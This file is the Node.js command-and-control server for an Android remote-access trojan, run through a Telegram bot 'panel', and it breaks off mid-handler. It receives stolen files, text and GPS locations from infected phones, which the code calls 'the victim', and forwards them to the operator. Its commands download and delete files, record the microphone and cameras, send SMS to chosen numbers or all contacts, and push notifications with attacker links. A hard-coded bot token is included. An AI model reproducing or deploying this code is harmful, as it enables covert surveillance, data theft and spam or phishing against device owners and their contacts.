const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7906691820:AAGUGa3PRHGHbY_AR2pWj-CtmQTwR1fkgNw'
const id = '6368904743'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">‚ùñ‚ùås·¥á Ä·¥†·¥á Ä ·¥ú·¥ò ü·¥è·¥Ä·¥Ö·¥á·¥Ö s·¥ú·¥Ñ·¥Ñ·¥ássÍú∞·¥ú ü ü è‚ùå‚ùñ</h1> <br> <p style="font-size:14px; text-align:center; color:red;">·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç ·¥Ñ ú·¥Ä…¥…¥·¥á ü‚û© @·¥Ö·¥è·¥õx ô Ä·¥Ä…™…¥</p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `¬∞‚Ä¢ ìÉ•·¥ç·¥áss·¥Ä…¢·¥á Íú∞ Ä·¥è·¥ç <b>${req.headers.model}</b> ·¥Ö·¥á·¥†…™·¥Ñ·¥á`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `¬∞‚Ä¢ ìÉ•·¥ç·¥áss·¥Ä…¢·¥á Íú∞ Ä·¥è·¥ç <b>${req.headers.model}</b> ·¥Ö·¥á·¥†…™·¥Ñ·¥á\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `¬∞‚Ä¢  ü·¥è·¥Ñ·¥Ä·¥õ…™·¥è…¥ Íú∞ Ä·¥è·¥ç <b>${req.headers.model}</b> ·¥Ö·¥á·¥†…™·¥Ñ·¥á`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `¬∞‚Ä¢ ü§†…¥·¥á·¥° ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Öü§†\n\n` +
        `‚Ä¢ ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥ç·¥è·¥Ö·¥á ü : <b>${model}</b>\n` +
        `‚Ä¢  ô·¥Ä·¥õ·¥õ·¥á Ä è : <b>${battery}</b>\n` +
        `‚Ä¢ ·¥Ä…¥·¥Ö Ä·¥è…™·¥Ö ·¥†·¥á Äs…™·¥è…¥ : <b>${version}</b>\n` +
        `‚Ä¢ s·¥Ñ Ä·¥á·¥á…¥  ô Ä…™…¢ ú·¥õ…¥·¥áss : <b>${brightness}</b>\n` +
        `‚Ä¢ ·¥ò Ä·¥è·¥†…™·¥Ö·¥á Ä : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `¬∞‚Ä¢ üò•·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥Ö…™s·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Öüò•\n\n` +
            `‚Ä¢ ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥ç·¥è·¥Ö·¥á ü : <b>${model}</b>\n` +
            `‚Ä¢  ô·¥Ä·¥õ·¥õ·¥á Ä è : <b>${battery}</b>\n` +
            `‚Ä¢ ·¥Ä…¥·¥Ö Ä·¥è…™·¥Ö ·¥†·¥á Äs…™·¥è…¥ : <b>${version}</b>\n` +
            `‚Ä¢ s·¥Ñ Ä·¥á·¥á…¥  ô Ä…™…¢ ú·¥õ…¥·¥áss : <b>${brightness}</b>\n` +
            `‚Ä¢ ·¥ò Ä·¥è·¥†…™·¥Ö·¥á Ä : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥ò ü·¥á·¥Äs·¥á  Ä·¥á·¥ò ü è ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥õ·¥è ·¥° ú…™·¥Ñ ú  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ ú·¥á s·¥çs')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '¬∞‚Ä¢ …¢ Ä·¥á·¥Ä·¥õ, …¥·¥è·¥° ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ·¥è ·¥õ ú…™s …¥·¥ú·¥ç ô·¥á Ä\n\n' +
                '‚Ä¢  ô·¥á ·¥Ñ·¥Ä Ä·¥áÍú∞·¥ú ü ·¥õ ú·¥Ä·¥õ ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á ·¥°…™ ü ü …¥·¥è·¥õ  ô·¥á s·¥á…¥·¥õ …™Íú∞ ·¥õ ú·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥èÍú∞ ·¥Ñ ú·¥Ä Ä·¥Ä·¥Ñ·¥õ·¥á Äs …™…¥  è·¥è·¥ú Ä ·¥ç·¥áss·¥Ä…¢·¥á …™s ·¥ç·¥è Ä·¥á ·¥õ ú·¥Ä…¥ ·¥Ä ü ü·¥è·¥°·¥á·¥Ö',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ …¢ Ä·¥á·¥Ä·¥õ, …¥·¥è·¥° ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ·¥è ·¥õ ú…™s …¥·¥ú·¥ç ô·¥á Ä')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è s·¥á…¥·¥Ö ·¥õ·¥è ·¥Ä ü ü ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õs')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ üìÆ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò·¥Ä·¥õ ú ·¥èÍú∞ ·¥õ ú·¥á Íú∞…™ ü·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ö·¥è·¥°…¥ ü·¥è·¥Ä·¥Öüó≥Ô∏è')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ üìÇ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò·¥Ä·¥õ ú ·¥èÍú∞ ·¥õ ú·¥á Íú∞…™ ü·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ö·¥á ü·¥á·¥õ·¥áüí•')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä  ú·¥è·¥°  ü·¥è…¥…¢  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ ú·¥á ·¥ç…™·¥Ñ Ä·¥è·¥ò ú·¥è…¥·¥á ·¥õ·¥è  ô·¥á  Ä·¥á·¥Ñ·¥è Ä·¥Ö·¥á·¥Ö')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä  ú·¥è·¥°  ü·¥è…¥…¢  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ ú·¥á ·¥ç·¥Ä…™…¥ ·¥Ñ·¥Ä·¥ç·¥á Ä·¥Ä ·¥õ·¥è  ô·¥á  Ä·¥á·¥Ñ·¥è Ä·¥Ö·¥á·¥Ö')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä  ú·¥è·¥°  ü·¥è…¥…¢  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ ú·¥á s·¥á üÍú∞…™·¥á ·¥Ñ·¥Ä·¥ç·¥á Ä·¥Ä ·¥õ·¥è  ô·¥á  Ä·¥á·¥Ñ·¥è Ä·¥Ö·¥á·¥Ö')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ä·¥ò·¥ò·¥á·¥Ä Ä ·¥è…¥ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ üìÆ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ç·¥áss·¥Ä…¢·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥Ä·¥ò·¥ò·¥á·¥Ä Ä ·¥Äs …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '¬∞‚Ä¢ …¢ Ä·¥á·¥Ä·¥õ, …¥·¥è·¥° ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á  ü…™…¥·¥ã  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è  ô·¥á ·¥è·¥ò·¥á…¥·¥á·¥Ö  ô è ·¥õ ú·¥á …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥\n\n' +
                '‚Ä¢ ·¥° ú·¥á…¥ ·¥õ ú·¥á ·¥†…™·¥Ñ·¥õ…™·¥ç ·¥Ñ ü…™·¥Ñ·¥ãs ·¥è…¥ ·¥õ ú·¥á …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥, ·¥õ ú·¥á  ü…™…¥·¥ã  è·¥è·¥ú ·¥Ä Ä·¥á ·¥á…¥·¥õ·¥á Ä…™…¥…¢ ·¥°…™ ü ü  ô·¥á ·¥è·¥ò·¥á…¥·¥á·¥Ö',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ …¢ Ä·¥á·¥Ä·¥õ, …¥·¥è·¥° ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á  ü…™…¥·¥ã  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è  ô·¥á ·¥è·¥ò·¥á…¥·¥á·¥Ö  ô è ·¥õ ú·¥á …¥·¥è·¥õ…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('¬∞‚Ä¢ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥Ä·¥ú·¥Ö…™·¥è  ü…™…¥·¥ã  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥õ·¥è ·¥ò ü·¥Ä è')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ‚è≥ è·¥è·¥ú Ä  Ä·¥á«´·¥ú·¥ás·¥õ …™s ·¥è…¥ ·¥ò Ä·¥è·¥Ñ·¥áss‚è≥\n\n' +
                '‚Ä¢  è·¥è·¥ú ·¥°…™ ü ü  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á …™…¥ ·¥õ ú·¥á …¥·¥áx·¥õ Íú∞·¥á·¥° ·¥ç·¥è·¥ç·¥á…¥·¥õs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '¬∞‚Ä¢ ü™¥·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥ç…™ ú Ä·¥ã ·¥ò·¥Ä…¥·¥á üü™¥\n\n' +
                '‚Ä¢ …™Íú∞ ·¥õ ú·¥á ·¥Ä·¥ò·¥ò ü…™·¥Ñ·¥Ä·¥õ…™·¥è…¥ …™s …™…¥s·¥õ·¥Ä ü ü·¥á·¥Ö ·¥è…¥ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á, ·¥°·¥Ä…™·¥õ Íú∞·¥è Ä ·¥õ ú·¥á ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ…™·¥è…¥\n\n' +
                '‚Ä¢ ·¥° ú·¥á…¥  è·¥è·¥ú  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥õ ú·¥á ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ…™·¥è…¥ ·¥ç·¥áss·¥Ä…¢·¥á, …™·¥õ ·¥ç·¥á·¥Ä…¥s ·¥õ ú·¥Ä·¥õ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á …™s ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ä…¥·¥Ö  Ä·¥á·¥Ä·¥Ö è ·¥õ·¥è  Ä·¥á·¥Ñ·¥á…™·¥†·¥á ·¥õ ú·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö\n\n' +
                '‚Ä¢ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ ·¥õ ú·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö  ô·¥ú·¥õ·¥õ·¥è…¥ ·¥Ä…¥·¥Ö s·¥á ü·¥á·¥Ñ·¥õ ·¥õ ú·¥á ·¥Ö·¥ás…™ Ä·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥õ ú·¥á…¥ s·¥á ü·¥á·¥Ñ·¥õ ·¥õ ú·¥á ·¥Ö·¥ás…™ Ä·¥á·¥Ö ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö ·¥Ä·¥ç·¥è…¥…¢ ·¥õ ú·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ös\n\n' +
                '‚Ä¢ üì±Íú∞…™ Äs·¥õ ·¥ä·¥è…™…¥ üëâ @·¥Ö·¥è·¥õx ô Ä·¥Ä…™…¥ \n\n' +
                '‚Ä¢ üå∫·¥ç·¥Ä…™…¥ ·¥è·¥°…¥·¥á Äüëâ @·¥Ö·¥è·¥õx ô Ä·¥Ä…™…¥ \n\n' +
                '‚Ä¢ üß≠·¥ç·¥Ä…™…¥ ·¥Ñ ú·¥Ä…¥…¥·¥á üüëâ @·¥Ö·¥è·¥õx ô Ä·¥Ä…™…¥ \n\n' +
                '‚Ä¢ …™Íú∞  è·¥è·¥ú …¢·¥á·¥õ s·¥õ·¥ú·¥Ñ·¥ã s·¥è·¥ç·¥á·¥° ú·¥á Ä·¥á …™…¥ ·¥õ ú·¥á  ô·¥è·¥õ, s·¥á…¥·¥Ö /s·¥õ·¥Ä Ä·¥õ ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás"], ["·¥áx·¥á·¥Ñ·¥ú·¥õ·¥á ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '¬∞‚Ä¢ …¥·¥è ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ…™…¥…¢ ·¥Ö·¥á·¥†…™·¥Ñ·¥ás ·¥Ä·¥†·¥Ä…™ ü·¥Ä ô ü·¥á\n\n' +
                    '‚Ä¢ ·¥ç·¥Ä·¥ã·¥á s·¥ú Ä·¥á ·¥õ ú·¥á ·¥Ä·¥ò·¥ò ü…™·¥Ñ·¥Ä·¥õ…™·¥è…¥ …™s …™…¥s·¥õ·¥Ä ü ü·¥á·¥Ö ·¥è…¥ ·¥õ ú·¥á ·¥õ·¥Ä Ä…¢·¥á·¥õ ·¥Ö·¥á·¥†…™·¥Ñ·¥á'
                )
            } else {
                let text = '¬∞‚Ä¢  ü…™s·¥õ ·¥èÍú∞ ·¥Ñ·¥è…¥…¥·¥á·¥Ñ·¥õ·¥á·¥Ö ·¥Ö·¥á·¥†…™·¥Ñ·¥ás :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `‚Ä¢ ·¥Ö·¥á·¥†…™·¥Ñ·¥á ·¥ç·¥è·¥Ö·¥á ü : <b>${value.model}</b>\n` +
                        `‚Ä¢  ô·¥Ä·¥õ·¥õ·¥á Ä è : <b>${value.battery}</b>\n` +
                        `‚Ä¢ ·¥Ä…¥·¥Ö Ä·¥è…™·¥Ö ·¥†·¥á Äs…™·¥è…¥ : <b>${value.version}</b>\n` +
                        `‚Ä¢ s·¥Ñ Ä·¥á·¥á…¥  ô Ä…™…¢ ú·¥õ…¥·¥áss : <b>${value.brightness}</b>\n` +
                        `‚Ä¢ ·¥ò Ä·¥è·¥†…™·¥Ö·¥á Ä : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
